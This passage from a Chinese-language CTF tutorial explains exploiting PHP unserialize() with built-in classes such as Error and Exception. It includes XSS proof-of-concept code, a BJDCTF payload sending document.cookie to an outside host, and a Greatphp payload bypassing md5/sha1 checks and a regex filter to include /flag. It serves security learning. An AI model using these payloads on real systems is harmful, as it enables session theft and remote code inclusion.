constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveDirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">GlobIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplTempFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFixedArray</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunctionAbstract</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunction</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionParameter</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionNamedType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClass</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionProperty</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClassConstant</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionZendExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__toString</span></span><br><span class="line">PDO::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOStatement</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapClient</span>::<span class="variable constant_">__call</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CURLFile</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__toString</span></span><br></pre></td></tr></table></figure>
<p>只需要注意一些常用的内置类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span></span><br><span class="line"><span class="built_in">Exception</span></span><br><span class="line">SoapClient</span><br><span class="line"><span class="built_in">DirectoryIterator</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span></span><br><span class="line"><span class="built_in">SplFileObject</span></span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure>
<h4 id="利用errorexception-内置类进行-xss"><a class="markdownIt-Anchor" href="#利用errorexception-内置类进行-xss"></a> 利用Error/Exception 内置类进行 XSS</h4>
<h5 id="error内置类"><a class="markdownIt-Anchor" href="#error内置类"></a> Error内置类</h5>
<p>使用条件:</p>
<ul>
<li>适用于php7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，可以尝试利用这个来做一个xss，直接利用xss来打。其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这也是挖洞的一种思路。</p>
<p>测试例子：</p>
<p>本地放一个error.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接可以弹出xss，触发了xss漏洞</p>
<h4 id="exception内置类"><a class="markdownIt-Anchor" href="#exception内置类"></a> Exception内置类</h4>
<ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<p>原理是类似的</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="bjdctf-2ndxss之光"><a class="markdownIt-Anchor" href="#bjdctf-2ndxss之光"></a> [BJDCTF 2nd]xss之光</h5>
<p>首先进入题目中，我们找到git泄露拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>这就是一个典型的反序列化函数，但是没有给出反序列化的类，我们无法构造pop链，只有利用php内置类来反序列化，加上一个echo，我们就可以利用<code>Error</code>内置类来<code>XSS</code></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc = new Exception(&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>一般xss的题都是在cookie理里，所以我们利用XSS把cookie带出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fde28dfb3-f224-<span class="number">48</span>d4-b579-f1ea61189930.node3.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>然后flag就在cookie中</p>
<h4 id="使用-errorexception-内置类绕过哈希比较"><a class="markdownIt-Anchor" href="#使用-errorexception-内置类绕过哈希比较"></a> 使用 Error/Exception 内置类绕过哈希比较</h4>
<p>Error和Exception这两个PHP内置类，但对他们不限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。</p>
<h5 id="error类"><a class="markdownIt-Anchor" href="#error类"></a> Error类</h5>
<p>条件：php7.0.0</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 属性 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>类属性：</strong></p>
<ul>
<li>message：错误消息内容</li>
<li>code：错误代码</li>
<li>file：抛出错误的文件名</li>
<li>line：抛出错误在该文件中的行数</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li>
<li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li>
<li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li>
<li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li>
<li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li>
<li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li>
<li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li>
<li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li>
</ul>
<h5 id="exception-类"><a class="markdownIt-Anchor" href="#exception-类"></a> Exception 类</h5>
<p>条件：php5</p>
<p>类摘要</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 属性 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>类属性：</strong></p>
<ul>
<li>message：异常消息内容</li>
<li>code：异常代码</li>
<li>file：抛出异常的文件名</li>
<li>line：抛出异常在该文件中的行号</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
<li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
<li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
<li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
<li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
<li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
<li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
<li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
</ul>
<p>在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>看看触发Error的__toString方法</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">输出</span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>下一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的</p>
<p>利用Error和Exception类的这一点可以绕过在PHP类中的哈希比较</p>
<h5 id="2020-极客大挑战greatphp"><a class="markdownIt-Anchor" href="#2020-极客大挑战greatphp"></a> [2020 极客大挑战]Greatphp</h5>
<p>还是一样的，给出源码，就代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br></pre></td></tr></table></figure>
<p>对于这个，我们常见的是利用数组绕过强类型，但是这个是在类中，不能使用数组，只有使用Error类。</p>
<p>md5()和sha1()可以对一个类进行hash，并且会触发这个类的 <code>__toString</code> 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法，刚才实验过，Error类中的<code>__toString</code>将类转换的字符串相等。</p>
<p>又存在preg_match，过滤了括号，无法调用函数，尝试<code>include &quot;/flag&quot;</code>,但是引号过滤了，我们可以使用<code>两次取反，自动获得字符串</code>的。(绕过引号，长知识了)</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">		   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">		   &#125;</span><br><span class="line">		   </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$cmd</span>)</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">也可以用，也需要用两次取反</span></span><br><span class="line"><span class="comment">$str1 = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!&quot;.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;;</span></span><br><span class="line"><span class="comment">$str = &quot;?&gt;&lt;?=include $_GET[1]?&gt;&quot;; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题我想到能不能同用hex编码</p>
